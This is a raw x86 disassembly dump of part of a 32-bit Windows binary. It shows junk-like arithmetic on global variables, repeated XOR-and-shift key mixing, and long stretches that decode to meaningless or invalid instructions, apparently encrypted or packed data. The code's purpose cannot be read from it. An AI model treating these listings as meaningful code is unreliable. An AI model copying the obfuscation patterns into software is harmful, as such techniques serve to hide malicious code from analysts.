  413688:	call   DWORD PTR ds:0x42e014
  41368e:	movzx  ecx,BYTE PTR ds:0x42842d
  413695:	and    DWORD PTR ds:0x428549,ecx
  41369b:	sbb    ecx,0x7147
  4136a1:	and    DWORD PTR ds:0x4284c5,ebx
  4136a7:	mov    ecx,DWORD PTR ds:0x428475
  4136ad:	add    DWORD PTR ds:0x42841d,ecx
  4136b3:	and    DWORD PTR ds:0x42836d,0x5196
  4136bd:	mov    eax,ds:0x422708
  4136c2:	adc    DWORD PTR ds:0x428425,0x635d
  4136cc:	mov    DWORD PTR [ebp-0xc],eax
  4136cf:	cmp    DWORD PTR ds:0x4284d1,0x0
  4136d6:	mov    DWORD PTR ds:0x428345,0x6dcc
  4136e0:	mov    ecx,DWORD PTR ds:0x428441
  4136e6:	jmp    0x413753
  4136eb:	mov    DWORD PTR ds:0x4284dd,0x2cf
  4136f5:	mov    DWORD PTR ds:0x428581,0x621d
  4136ff:	cmp    DWORD PTR ds:0x4284d1,0x0
  413706:	jbe    0x41373d
  41370c:	push   0x4284d1
  413711:	push   0x428405
  413716:	push   0x2216
  41371b:	call   DWORD PTR ds:0x42e258
  413721:	and    ecx,ecx
  413723:	mov    ecx,DWORD PTR ds:0x4283ad
  413729:	mov    ecx,DWORD PTR [ecx]
  41372b:	add    DWORD PTR ds:0x42836d,ecx
  413731:	or     ecx,ecx
  413733:	sbb    DWORD PTR ds:0x4284ed,0x6873
  41373d:	sbb    DWORD PTR ds:0x4284f5,ecx
  413743:	adc    DWORD PTR ds:0x428471,0x1149
  41374d:	or     DWORD PTR ds:0x4284f1,edx
  413753:	mov    eax,DWORD PTR [ebp-0x28]
  413756:	cmp    DWORD PTR ds:0x428455,0x0
  41375d:	mov    ecx,0xa9f
  413762:	mov    DWORD PTR ds:0x42841d,0x1875
  41376c:	mov    DWORD PTR ds:0x4284f1,0x319d
  413776:	jmp    0x41383a
  41377b:	mov    DWORD PTR ds:0x4284e1,0x86c
  413785:	cmp    DWORD PTR ds:0x428455,0x0
  41378c:	jle    0x4137bf
  413792:	push   0x50b5
  413797:	call   DWORD PTR ds:0x42e25c
  41379d:	add    DWORD PTR ds:0x428365,0x737d
  4137a7:	sub    ecx,DWORD PTR ds:0x4284f1
  4137ad:	mov    ecx,DWORD PTR ds:0x428565
  4137b3:	xor    ecx,DWORD PTR ds:0x428431
  4137b9:	mov    DWORD PTR ds:0x428565,ecx
  4137bf:	inc    ecx
  4137c0:	movzx  ecx,BYTE PTR ds:0x428365
  4137c7:	sub    ecx,DWORD PTR ds:0x4284d1
  4137cd:	mov    DWORD PTR ds:0x428365,ecx
  4137d3:	cmp    DWORD PTR ds:0x42844d,0x0
  4137da:	not    ecx
  4137dc:	mov    DWORD PTR ds:0x42840d,0x5561
  4137e6:	jmp    0x41383a
  4137eb:	mov    DWORD PTR ds:0x428581,0x2772
  4137f5:	cmp    DWORD PTR ds:0x42844d,0x0
  4137fc:	jle    0x41381e
  413802:	push   0x5196
  413807:	push   0x42820f
  41380c:	call   DWORD PTR ds:0x42e260
  413812:	sbb    DWORD PTR ds:0x428369,ecx
  413818:	xor    ecx,DWORD PTR ds:0x42857d
  41381e:	and    DWORD PTR ds:0x42843d,edi
  413824:	inc    DWORD PTR ds:0x428451
  41382a:	add    DWORD PTR ds:0x428359,0x3293
  413834:	or     DWORD PTR ds:0x428425,ecx
  41383a:	mov    DWORD PTR [ebp-0x24],eax
  41383d:	mov    ecx,DWORD PTR [ebp-0x24]
  413840:	push   0x4
  413842:	sub    DWORD PTR ds:0x4284dd,0x4aeb
  41384c:	pop    eax
  41384d:	sbb    DWORD PTR ds:0x42855d,0x428359
  413857:	sub    eax,ecx
  413859:	cmp    DWORD PTR ds:0x428371,0x0
  413860:	mov    ecx,DWORD PTR ds:0x4284f1
  413866:	not    ecx
  413868:	movzx  ecx,BYTE PTR ds:0x428349
  41386f:	mov    ecx,DWORD PTR ds:0x428465
  413875:	jmp    0x4138c3
  41387a:	mov    DWORD PTR ds:0x4284e1,0x61cd
  413884:	cmp    DWORD PTR ds:0x428371,0x0
  41388b:	je     0x4138b5
  413891:	push   0x4284e5
  413896:	push   0x4282df
  41389b:	call   DWORD PTR ds:0x42e264
  4138a1:	or     DWORD PTR ds:0x428461,0x428425
  4138ab:	mov    DWORD PTR ds:0x428421,0x2055
  4138b5:	sub    ecx,DWORD PTR ds:0x42845d
  4138bb:	or     ecx,DWORD PTR ds:0x42840d
  4138c1:	neg    ecx
  4138c3:	mov    ecx,DWORD PTR [ebp-0x20]
  4138c6:	add    ecx,eax
  4138c8:	mov    DWORD PTR [ebp-0x30],ecx
  4138cb:	lea    eax,[ebp-0x3c]
  4138ce:	mov    DWORD PTR [ebp-0x38],eax
  4138d1:	mov    eax,DWORD PTR [ebp-0x18]
  4138d4:	mov    ecx,DWORD PTR [ebp-0x18]
  4138d7:	xor    eax,edi
  4138d9:	xor    ecx,ebx
  4138db:	shr    eax,0x2
  4138de:	shl    ecx,0x1e
  4138e1:	or     eax,ecx
  4138e3:	mov    DWORD PTR [ebp-0x2c],eax
  4138e6:	mov    DWORD PTR [ebp-0x8],0xa5069bbe
  4138ed:	mov    eax,DWORD PTR [ebp-0x8]
  4138f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4138f3:	xor    eax,edi
  4138f5:	xor    ecx,ebx
  4138f7:	shr    eax,0x2
  4138fa:	shl    ecx,0x1e
  4138fd:	or     ecx,eax
  4138ff:	push   ecx
  413900:	lea    eax,[ebp-0x8]
  413903:	push   eax
  413904:	lea    eax,[ebp-0x80]
  413907:	push   eax
  413908:	call   0x411c08
  41390d:	mov    eax,DWORD PTR [ebp-0x8]
  413910:	mov    ecx,DWORD PTR [ebp-0x8]
  413913:	xor    eax,edi
  413915:	xor    ecx,ebx
  413917:	shr    eax,0x2
  41391a:	shl    ecx,0x1e
  41391d:	or     ecx,eax
  41391f:	push   ecx
  413920:	lea    eax,[ebp-0x24]
  413923:	push   eax
  413924:	mov    eax,DWORD PTR [ebp+0x8]
  413927:	mov    ecx,DWORD PTR [ebp+0xc]
  41392a:	shrd   eax,ecx,0x2
  41392e:	shr    ecx,0x2
  413931:	mov    ecx,DWORD PTR [ebp+0x8]
  413934:	mov    edx,DWORD PTR [ebp+0xc]
  413937:	xor    eax,esi
  413939:	xor    edx,edx
  41393b:	or     eax,edx
  41393d:	lea    eax,[ebp+eax*4-0x7c]
  413941:	push   eax
  413942:	shl    ecx,0x1e
  413945:	call   0x411c08
  41394a:	mov    eax,DWORD PTR [ebp-0x8]
  41394d:	mov    ecx,DWORD PTR [ebp-0x8]
  413950:	xor    eax,edi
  413952:	xor    ecx,ebx
  413954:	shr    eax,0x2
  413957:	shl    ecx,0x1e
  41395a:	or     ecx,eax
  41395c:	push   ecx
  41395d:	lea    eax,[ebp-0x30]
  413960:	push   eax
  413961:	jmp    0x413c9a
  413966:	in     eax,dx
  413967:	dec    edi
  413968:	ret    
  413969:	in     al,dx
  41396a:	fs jl  0x413963
  41396d:	pop    ebx
  41396e:	push   0xebe3e744
  413973:	cmp    ebx,ebx
  413975:	jecxz  0x413963
  413977:	xchg   BYTE PTR [esi-0x413b1242],bh
  41397d:	mov    esi,0x9431879e
  413982:	mov    dl,0x99
  413984:	jns    0x4139a1
  413986:	fwait
  413987:	xchg   edi,eax
  413988:	add    cl,BYTE PTR [edx+0x13e63d71]
  41398e:	aas    
  41398f:	mov    esp,0x5f733d88
  413994:	and    edi,DWORD PTR [esi-0x7f]
  413997:	jns    0x413964
  413999:	xor    al,0xa3
  41399b:	pop    esp
  41399c:	jecxz  0x4139a0
  41399e:	mov    ecx,0xc0b3922b
  4139a3:	dec    ebp
  4139a4:	dec    edx
  4139a5:	aam    0x43
  4139a7:	fwait
  4139a8:	leave  
  4139a9:	ror    DWORD PTR gs:[eax],cl
  4139ac:	aaa    
  4139ad:	test   eax,0xec2cf71c
  4139b2:	sub    bh,BYTE PTR [esi-0x2e]
  4139b5:	xlat   BYTE PTR ds:[ebx]
  4139b6:	mov    ah,0x9f
  4139b8:	cmp    DWORD PTR [eax],ebp
  4139ba:	push   0x26
  4139bc:	push   edx
  4139bd:	or     ah,ch
  4139bf:	add    BYTE PTR [edi+0x34],bh
  4139c2:	scas   eax,DWORD PTR es:[edi]
  4139c3:	cli    
  4139c4:	dec    esi
  4139c5:	or     al,0xe1
  4139c7:	out    dx,eax
  4139c8:	or     DWORD PTR [ebx],0xfffffffa
  4139cb:	test   ebp,ebx
  4139cd:	inc    esi
  4139ce:	div    DWORD PTR [ebp+0x23]
  4139d1:	jmp    0x413963
  4139d3:	ret    0xafe7
  4139d6:	sub    bl,dh
  4139d8:	and    ah,BYTE PTR [ebp+0x17]
  4139db:	adc    DWORD PTR [eax-0x80],esp
  4139de:	inc    ebp
  4139df:	scas   al,BYTE PTR es:[edi]
  4139e0:	div    DWORD PTR [ecx]
  4139e2:	in     al,dx
  4139e3:	dec    esi
  4139e4:	mov    es,WORD PTR [ecx-0x65]
  4139e7:	ret    
  4139e8:	imul   ebp,DWORD PTR ds:0x8dd79068,0xbe581b02
  4139f2:	imul   DWORD PTR [ecx+edi*2-0x33]
  4139f6:	in     al,dx
  4139f7:	das    
  4139f8:	in     eax,dx
  4139f9:	aaa    
  4139fa:	aam    0x2e
  4139fc:	push   eax
  4139fd:	icebp  
  4139fe:	iret   
  4139ff:	dec    eax
  413a00:	stos   BYTE PTR es:[edi],al
  413a01:	adc    eax,0x4e999586
  413a06:	inc    ebp
  413a07:	mov    edx,ds
  413a09:	xchg   ecx,eax
  413a0a:	xchg   ebx,eax
  413a0b:	or     edx,DWORD PTR [ebx]
  413a0d:	ins    BYTE PTR es:[edi],dx
  413a0e:	sub    BYTE PTR [eax+0x3b],dl
  413a11:	adc    DWORD PTR [esi],ebx
  413a13:	add    dl,ah
  413a15:	mov    ah,0x38
  413a17:	fwait
  413a18:	ja     0x413a72
  413a1a:	jns    0x4139f8
  413a1c:	clc    
  413a1d:	xor    ebx,0x62ad72c3
  413a23:	aam    0xfd
  413a25:	cmp    BYTE PTR ds:0x376bc7d0,dh
  413a2b:	xchg   DWORD PTR [edx-0x46],esi
  413a2e:	cmp    eax,0x94cda527
  413a33:	sub    DWORD PTR [ebp+0x4b7aeb25],eax
  413a39:	jg     0x4139ce
  413a3b:	jo     0x413a14
  413a3d:	inc    esi
  413a3e:	popf   
  413a3f:	shl    BYTE PTR ds:0x2cf8d76b,1
  413a45:	(bad)  
  413a46:	repnz adc DWORD PTR [esi-0x4b5dcc9a],ebp
  413a4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a4e:	adc    ebx,ebx
  413a50:	mov    dl,0x7e
  413a52:	push   ds
  413a53:	xor    eax,0xe247e30d
  413a58:	cld    
  413a59:	push   cs
  413a5a:	pop    esi
  413a5b:	add    ebx,DWORD PTR [eax-0x73]
  413a5e:	inc    ebx
  413a5f:	or     eax,0x234e3602
  413a64:	xchg   ebx,eax
  413a65:	xor    al,0xa7
  413a67:	adc    cl,0x63
  413a6a:	(bad)  
  413a6b:	pop    ds
  413a6c:	shl    DWORD PTR [ebx],1
  413a6e:	sbb    BYTE PTR [edi+eax*8],cl
  413a71:	cwde   
  413a72:	loopne 0x4139fb
  413a74:	xchg   edx,eax
  413a75:	fs push ss
  413a77:	cli    
  413a78:	xchg   ebp,eax
  413a79:	inc    eax
  413a7a:	dec    ebx
  413a7b:	lahf   
  413a7c:	and    ebp,DWORD PTR [ecx+0x77feb01c]
  413a82:	out    dx,al
  413a83:	rol    DWORD PTR [edx],0x40
  413a86:	clc    
  413a87:	mov    bh,0x7f
  413a89:	adc    ebp,DWORD PTR [edx+esi*2]
  413a8c:	mov    ds:0x4aa39a3c,al
  413a91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a92:	inc    ecx
  413a93:	cmp    esi,esi
  413a95:	ret    0xcb9c
  413a98:	rcr    BYTE PTR [esi],0x64
  413a9b:	inc    ebp
  413a9c:	iret   
  413a9d:	add    DWORD PTR [bp+si-0x374],0x4827cf92
  413aa6:	push   edi
  413aa7:	sbb    al,0x64
  413aa9:	cld    
  413aaa:	bswap  esp
  413aac:	popf   
  413aad:	and    ah,bh
  413aaf:	inc    esi
  413ab0:	je     0x413ab2
  413ab2:	ss aaa 
  413ab4:	imul   ecx,DWORD PTR [esi-0x1a],0xb3a2d91a
  413abb:	cmp    ebp,esp
  413abd:	xor    al,0xd8
  413abf:	cmp    DWORD PTR [eax-0x13c9dbd2],edi
  413ac5:	add    DWORD PTR [ebp-0x7f2a5ae9],esi
  413acb:	inc    esp
  413acc:	adc    DWORD PTR [eax+edx*8],0xffffffb9
  413ad0:	les    edx,FWORD PTR [esi]
  413ad2:	push   edx
  413ad3:	imul   esp,DWORD PTR [edi+0x3b],0x1a
  413ad7:	ins    DWORD PTR es:[edi],dx
  413ad8:	pop    ds
  413ad9:	push   esp
  413ada:	xchg   ebp,eax
  413adb:	mov    dh,BYTE PTR [ebx+eax*2+0x2]
  413adf:	das    
  413ae0:	cmp    eax,0x9649f7d7
  413ae5:	mov    ah,0xd6
  413ae7:	(bad)  
  413ae9:	fisttp QWORD PTR [ecx+0x4c74ebdf]
  413aef:	mov    ?,WORD PTR gs:[edi]
  413af2:	sbb    al,0x64
  413af4:	mov    ds:0x22b052ae,eax
  413af9:	std    
  413afa:	retf   0x4aff
  413afd:	inc    ecx
  413afe:	mov    ds:0x1115e48c,al
  413b03:	mov    eax,ds:0xcecd712f
  413b08:	hlt    
  413b09:	stos   BYTE PTR es:[edi],al
  413b0a:	imul   dh
  413b0c:	iret   
  413b0d:	dec    eax
  413b0e:	in     al,0xb0
  413b10:	rol    bl,1
  413b12:	add    cl,ah
  413b14:	shr    edx,1
  413b16:	mov    dl,0xee
  413b18:	lods   al,BYTE PTR ds:[esi]
  413b19:	xor    eax,0x878033fe
  413b1e:	mov    eax,0x651bfecd
  413b23:	jge    0x413ae0
  413b25:	add    eax,0xa415aaac
  413b2a:	or     DWORD PTR [edi+0x4d],eax
  413b2d:	inc    esi
  413b2e:	jge    0x413af4
  413b30:	inc    esi
  413b31:	push   esi
  413b32:	mov    fs,WORD PTR [edi+edx*1]
  413b35:	fimul  WORD PTR [edi]
  413b37:	imul   edi,DWORD PTR [ebx],0x35
  413b3a:	in     eax,0x96
  413b3c:	xchg   ecx,eax
  413b3d:	ror    DWORD PTR [esi],0x3
  413b40:	add    ebp,DWORD PTR [edi-0x557ac1ae]
  413b46:	and    DWORD PTR [edx],ebx
  413b48:	enter  0xa55,0x4b
  413b4c:	push   0xffffffbe
  413b4e:	imul   BYTE PTR [ebx+0x37c7e480]
  413b54:	add    eax,0x422a830
  413b59:	outs   dx,BYTE PTR ds:[esi]
  413b5a:	pop    edi
  413b5b:	js     0x413b59
  413b5d:	retf   0xd287
  413b60:	xchg   BYTE PTR ds:0xf601f26a,dh
  413b66:	ins    BYTE PTR es:[edi],dx
  413b67:	add    DWORD PTR [ecx],esi
  413b69:	clc    
  413b6a:	pop    ecx
  413b6b:	loope  0x413bba
  413b6d:	pop    ecx
  413b6e:	mov    al,ds:0x8dbfe735
  413b73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b74:	adc    ecx,DWORD PTR [esi+0x7d]
  413b77:	adc    ch,dh
  413b79:	jne    0x413bcf
  413b7b:	(bad)  
  413b7d:	push   cs
  413b7e:	pop    ds
  413b7f:	mov    bl,0xa5
  413b81:	retf   0x328
  413b84:	icebp  
  413b85:	push   ds
  413b86:	cmp    bh,bl
  413b88:	loop   0x413bb7
  413b8a:	jmp    0xfd44:0x3513944e
  413b91:	inc    edx
  413b92:	es pusha 
  413b94:	cmp    edx,DWORD PTR [edi]
  413b96:	push   cs
  413b97:	push   eax
  413b98:	outs   dx,DWORD PTR ds:[esi]
  413b99:	add    DWORD PTR ds:0xf25b4dcb,esi
  413b9f:	push   ecx
  413ba0:	mov    edx,0x62c7080c
  413ba5:	and    al,0x85
  413ba7:	clc    
  413ba8:	inc    ebp
  413ba9:	sbb    eax,0xf97496d3
  413bae:	rcr    BYTE PTR [edx],0xf5
  413bb1:	into   
  413bb2:	and    DWORD PTR [eax+0x32b6e024],esp
  413bb8:	cli    
  413bb9:	sbb    bl,BYTE PTR [edx-0x7a23e24e]
  413bbf:	fcomp  QWORD PTR [edx+0x51]
  413bc2:	mov    ebp,0xd3751f00
  413bc7:	call   0x790d:0x5be14f88
  413bce:	mov    bh,0xf9
  413bd0:	mov    esi,0x9d44cfbd
  413bd5:	call   0x432c:0x3c7e2178
  413bdc:	aas    
  413bdd:	adc    DWORD PTR [esi+ebx*2],esi
  413be0:	test   BYTE PTR [ecx+0x1ee4bda7],0x97
  413be7:	leave  
  413be8:	push   es
  413be9:	add    edi,edx
  413beb:	xchg   ecx,eax
  413bec:	mov    eax,0x2e2ed72f
  413bf1:	ins    DWORD PTR es:[edi],dx
  413bf2:	push   ecx
  413bf3:	push   ecx
  413bf4:	jg     0x413bc2
  413bf6:	test   al,0x75
  413bf8:	(bad)  
  413bf9:	out    dx,al
  413bfa:	stos   BYTE PTR es:[edi],al
  413bfb:	je     0x413bee
  413bfd:	imul   esi
  413bff:	jmp    0xc72daeb8
  413c04:	push   ebp
  413c05:	jl     0x413c84
  413c07:	in     al,dx
  413c08:	test   al,0x19
  413c0a:	out    0xf1,eax
  413c0c:	dec    DWORD PTR [ebx-0x30986c75]
  413c12:	cmp    eax,0x3b7f4611
  413c17:	pop    es
  413c18:	or     eax,0x90b17691
  413c1d:	xchg   ecx,eax
  413c1e:	out    dx,al
  413c1f:	adc    eax,0xbbb09c9b
  413c24:	sbb    ecx,esp
  413c26:	and    ebx,edi
  413c28:	rol    esi,cl
  413c2a:	adc    eax,0x3f66129e
  413c2f:	(bad)  
  413c30:	cli    
  413c31:	lods   al,BYTE PTR ds:[esi]
  413c32:	ins    DWORD PTR es:[edi],dx
  413c33:	mov    ebx,0x4ae8e83e
  413c38:	mov    al,0xb0
  413c3a:	pushf  
  413c3b:	fucom  st(1)
  413c3d:	outs   dx,BYTE PTR ds:[esi]
  413c3e:	dec    edx
  413c3f:	stos   DWORD PTR es:[edi],eax
  413c40:	icebp  
  413c41:	dec    esp
  413c42:	js     0x413c8c
  413c44:	cmp    BYTE PTR [ebx+0x71913926],dh
  413c4a:	and    BYTE PTR [esi+eiz*2-0x34],bl
  413c4e:	adc    al,0x96
  413c50:	mov    ah,0xa2
  413c52:	jg     0x413cab
  413c54:	inc    edi
  413c55:	dec    esi
  413c56:	fs iret 
  413c58:	cmp    cl,BYTE PTR [eax]
  413c5a:	icebp  
  413c5b:	mov    al,0x7b
  413c5d:	cmp    al,0x49
  413c5f:	adc    DWORD PTR [ecx],esi
  413c61:	imul   eax,DWORD PTR [esi-0x24],0x6448f836
  413c68:	jae    0x413ce6
  413c6a:	ds out 0xef,al
  413c6d:	push   es
  413c6e:	icebp  
  413c6f:	jo     0x413ccb
  413c71:	push   0xffffffa2
  413c73:	idiv   edx
  413c75:	lods   al,BYTE PTR ds:[esi]
  413c76:	cli    
  413c77:	cmp    eax,0x1974f7c0
  413c7c:	shl    BYTE PTR [edx],cl
  413c7e:	add    al,0xe8
  413c80:	loop   0x413c7b
  413c82:	das    
  413c83:	fistp  WORD PTR [edx]
  413c85:	sti    
  413c86:	mov    al,ds:0x88fa9495
  413c8b:	adc    DWORD PTR [eax-0x3b],ebp
  413c8e:	not    DWORD PTR [edx]
  413c90:	fistp  DWORD PTR [ebx+0x793f6e37]
  413c96:	jecxz  0x413c19
  413c98:	pushf  
  413c99:	mov    BYTE PTR [ebx+0x4d8b1045],cl
  413c9f:	adc    al,0xf
  413ca1:	lods   al,BYTE PTR ds:[esi]
  413ca2:	enter  0xc102,0xe9
  413ca6:	add    cl,BYTE PTR [ebx+0x558b104d]
  413cac:	adc    al,0x33
  413cae:	(bad)  
  413caf:	xor    edx,edx
  413cb1:	or     eax,edx
  413cb3:	lea    eax,[ebp+eax*4-0x7c]
  413cb7:	push   eax
  413cb8:	shl    ecx,0x1e
  413cbb:	call   0x411c08
  413cc0:	mov    eax,DWORD PTR [ebp-0x8]
  413cc3:	mov    ecx,DWORD PTR [ebp-0x8]
  413cc6:	xor    ecx,ebx
  413cc8:	xor    eax,edi
  413cca:	shl    ecx,0x1e
  413ccd:	shr    eax,0x2
  413cd0:	or     ecx,eax
  413cd2:	push   ecx
  413cd3:	lea    eax,[ebp-0x2c]
  413cd6:	push   eax
  413cd7:	mov    eax,DWORD PTR [ebp+0x10]
  413cda:	mov    ecx,DWORD PTR [ebp+0x14]
  413cdd:	shrd   eax,ecx,0x2
  413ce1:	shr    ecx,0x2
  413ce4:	mov    ecx,DWORD PTR [ebp+0x10]
  413ce7:	mov    edx,DWORD PTR [ebp+0x14]
  413cea:	xor    edx,edx
  413cec:	xor    eax,esi
  413cee:	or     eax,edx
  413cf0:	shl    ecx,0x1e
  413cf3:	mov    ecx,DWORD PTR [ebp+0x10]
  413cf6:	mov    edx,DWORD PTR [ebp+0x14]
  413cf9:	shrd   ecx,edx,0x2
  413cfd:	shr    edx,0x2
  413d00:	mov    edx,DWORD PTR [ebp+0x10]
  413d03:	mov    ebx,DWORD PTR [ebp+0x14]
  413d06:	xor    ecx,esi
  413d08:	xor    ebx,ebx
  413d0a:	or     ecx,ebx
  413d0c:	add    eax,ecx
  413d0e:	lea    eax,[ebp+eax*4-0x7c]
  413d12:	push   eax
  413d13:	shl    edx,0x1e
  413d16:	call   0x411c08
  413d1b:	mov    eax,DWORD PTR [ebp-0x8]
  413d1e:	mov    ecx,DWORD PTR [ebp-0x8]
  413d21:	xor    ecx,0xfffffffe
  413d24:	shl    ecx,0x1e
  413d27:	xor    eax,edi
  413d29:	shr    eax,0x2
  413d2c:	or     ecx,eax
  413d2e:	push   ecx
  413d2f:	lea    eax,[ebp-0x38]
  413d32:	push   eax
  413d33:	mov    eax,DWORD PTR [ebp+0x10]
  413d36:	mov    ecx,DWORD PTR [ebp+0x14]
  413d39:	shrd   eax,ecx,0x2
  413d3d:	shr    ecx,0x2
  413d40:	jmp    0x414079
  413d45:	lock aad 0x95
  413d48:	dec    ecx
  413d49:	mov    bh,0x8a
  413d4b:	xor    al,0x7c
  413d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d4e:	cmp    eax,0x4f6edd72
  413d53:	xchg   esi,eax
  413d54:	jecxz  0x413d71
  413d56:	mov    WORD PTR [esi-0x413b1242],?
  413d5c:	mov    esi,0x922c2e56
  413d61:	imul   esi,ebp,0x64
  413d64:	(bad)  
  413d65:	addr16 gs in al,dx
  413d68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d69:	jp     0x413d19
  413d6b:	xchg   ebx,eax
  413d6c:	scas   eax,DWORD PTR es:[edi]
  413d6d:	xor    eax,0x5df9c1f
  413d72:	daa    
  413d73:	stos   BYTE PTR es:[edi],al
  413d74:	ds inc esi
  413d76:	sti    
  413d77:	ret    0x7564
  413d7a:	cmp    eax,0xbf04b84c
  413d7f:	les    esp,FWORD PTR [esi-0x14]
  413d82:	stc    
  413d83:	cmp    al,0xe
  413d85:	pinsrw mm1,WORD PTR [edi],0x1f
  413d89:	cs popa 
  413d8b:	push   ds
  413d8c:	shl    BYTE PTR [ecx-0x35],cl
  413d8f:	in     eax,dx
  413d90:	sub    al,0x1f
  413d92:	jbe    0x413d52
  413d94:	aas    
  413d95:	mov    ebp,0xd3725a67
  413d9a:	jge    0x413df6
  413d9c:	mov    esi,0xa6db0a4a
  413da1:	push   ecx
  413da2:	lds    ebx,FWORD PTR [esi-0x6fe19511]
  413da8:	mov    ebp,0x2e92087d
  413dad:	xor    eax,0x4136c816
  413db2:	in     eax,0xf8
  413db4:	out    0x34,al
  413db6:	sub    al,0xd2
  413db8:	ins    BYTE PTR es:[edi],dx
  413db9:	jge    0x413d85
  413dbb:	push   eax
  413dbc:	clc    
  413dbd:	pop    ebx
  413dbe:	xchg   esi,eax
  413dbf:	and    DWORD PTR [ebx+0x3b205eba],ecx
  413dc5:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  413dc7:	leave  
  413dc8:	cmp    dl,bh
  413dca:	fisub  DWORD PTR cs:[edx]
  413dcd:	pop    ebx
  413dce:	ss test ebp,edx
  413dd1:	or     cl,dh
  413dd3:	scas   eax,DWORD PTR es:[edi]
  413dd4:	aam    0xa5
  413dd6:	fst    st(1)
  413dd8:	sub    DWORD PTR [edx-0x64],ebp
  413ddb:	scas   al,BYTE PTR es:[edi]
  413ddc:	aad    0x35
  413dde:	add    ebx,DWORD PTR [edi+0x7e6d8ea]
  413de4:	dec    edi
  413de5:	sbb    dl,BYTE PTR [edx+0x3afc57b3]
  413deb:	jecxz  0x413e66
  413ded:	xor    eax,0xd9805d0
  413df2:	push   eax
  413df3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413df4:	and    BYTE PTR [edi],al
  413df6:	rol    DWORD PTR [edx+0x43],1
  413df9:	and    BYTE PTR [esi+edi*1],dh
  413dfc:	sbb    BYTE PTR [esp+ebx*1-0x7f],cl
  413e00:	add    al,0x41
  413e02:	xchg   ebx,eax
  413e03:	or     eax,0x3237d8cf
  413e08:	pop    ebx
  413e09:	mov    esi,DWORD PTR [ebx+0x67]
  413e0c:	stos   BYTE PTR es:[edi],al
  413e0d:	adc    BYTE PTR ds:0xf0382c61,bl
  413e13:	not    edi
  413e15:	lods   al,BYTE PTR ds:[esi]
  413e16:	mov    ax,ds:0xc827f6ec
  413e1c:	(bad)  [edx*4-0x5ace5a09]
  413e23:	bound  eax,QWORD PTR [esp+eiz*4]
  413e26:	rcr    DWORD PTR [ebp+0x755b999],1
  413e2c:	(bad)  
  413e2d:	rcl    BYTE PTR [ebp+edx*2+0x2649d713],cl
  413e34:	dec    ecx
  413e35:	pop    eax
  413e36:	push   0xffffffa1
  413e38:	fcomip st,st(5)
  413e3a:	rcl    DWORD PTR [edx+0x35e445ed],cl
  413e40:	outs   dx,BYTE PTR ds:[esi]
  413e41:	or     DWORD PTR [ebx-0x19ce4991],eax
  413e47:	xchg   ebp,eax
  413e48:	(bad)  
  413e49:	out    dx,al
  413e4a:	cli    
  413e4b:	xchg   esp,eax
  413e4c:	repnz imul ecx,DWORD PTR [esi],0xe0aa5d02
  413e53:	xchg   DWORD PTR [edx+0x3c],eax
  413e56:	jmp    DWORD PTR [esi-0x2e812f73]
  413e5c:	cmp    eax,0x796a1e66
  413e61:	inc    ebx
  413e62:	lds    eax,FWORD PTR [edi+0x11]
  413e65:	mov    ds:0x3792fe0a,al
  413e6a:	out    0x8,al
  413e6c:	xor    DWORD PTR [ecx],esi
  413e6e:	jae    0x413df0
  413e70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e71:	rol    dh,0x81
  413e74:	ds pop ss
  413e76:	imul   ebx,esi,0xffffff82
  413e79:	loope  0x413e43
  413e7b:	fild   QWORD PTR [edx-0xd]
  413e7e:	and    BYTE PTR [ecx+0xc],cl
  413e81:	sbb    BYTE PTR [esi-0x8],dl
  413e84:	push   esi
  413e85:	cli    
  413e86:	and    BYTE PTR [ecx-0x6f],al
  413e89:	(bad)  
  413e8a:	repnz aaa 
  413e8c:	bound  esi,QWORD PTR [ebx]
  413e8e:	mov    ch,0x52
  413e90:	jae    0x413ee9
  413e92:	test   eax,0x37bab17b
  413e97:	in     al,dx
  413e98:	jecxz  0x413ef5
  413e9a:	and    edx,DWORD PTR [ebx-0x61d03530]
  413ea0:	xchg   ecx,eax
  413ea1:	daa    
  413ea2:	enter  0xcdf9,0xd
  413ea6:	fild   DWORD PTR [ecx+0x24]
  413ea9:	and    ebp,DWORD PTR [edx-0x33]
  413eac:	(bad)  
  413ead:	fild   DWORD PTR [edi-0x62d15a31]
  413eb3:	sub    eax,0x31679358
  413eb8:	test   al,0xfc
  413eba:	aaa    
  413ebb:	fisubr DWORD PTR [edi]
  413ebd:	neg    DWORD PTR [edi+0x4f930ccc]
  413ec3:	(bad)  [edi+0x72129b6e]
  413ec9:	(bad)  
  413eca:	xchg   esi,eax
  413ecb:	pop    ecx
  413ecc:	cmp    al,BYTE PTR [ebp+0x5e2def89]
  413ed2:	xor    edi,DWORD PTR [esi+0x16a62d70]
  413ed8:	or     al,0x8c
  413eda:	fisttp QWORD PTR [edi-0x1d]
  413edd:	test   eax,0x35a80d7b
  413ee2:	jge    0x413ec2
  413ee4:	je     0x413ea1
  413ee6:	inc    DWORD PTR [eax]
  413ee8:	ficomp WORD PTR [esi+edi*1-0x7a]
  413eec:	enter  0xc2fd,0xfd
  413ef0:	dec    ebx
  413ef1:	xchg   edi,eax
  413ef3:	sub    ecx,edx
  413ef5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ef6:	add    ah,dl
  413ef8:	call   0x9d19a8d9
  413efd:	xor    DWORD PTR [eax],edi
  413eff:	in     al,dx
  413f00:	lea    esi,[edx]
  413f02:	pop    esp
  413f03:	sub    al,0x60
  413f05:	clc    
  413f06:	or     al,0xb3
  413f08:	cmc    
  413f09:	sar    DWORD PTR [edx+eiz*4],0x86
  413f0d:	jp     0x413f66
  413f0f:	mov    eax,0xaefcb642
  413f14:	and    al,0x8c
  413f16:	mov    ebp,DWORD PTR [esi-0x14083355]
  413f1c:	mov    WORD PTR [edx],?
  413f1e:	and    eax,0x6e3e7a96
  413f23:	daa    
  413f24:	int    0xb1
  413f26:	fiadd  DWORD PTR [edi+esi*4-0x1f]
  413f2a:	test   BYTE PTR [ebp-0x26],ah
  413f2d:	xor    eax,0x723f7795
  413f32:	test   BYTE PTR [edi+0x1c],0x8c
  413f36:	pop    eax
  413f37:	xchg   edi,eax
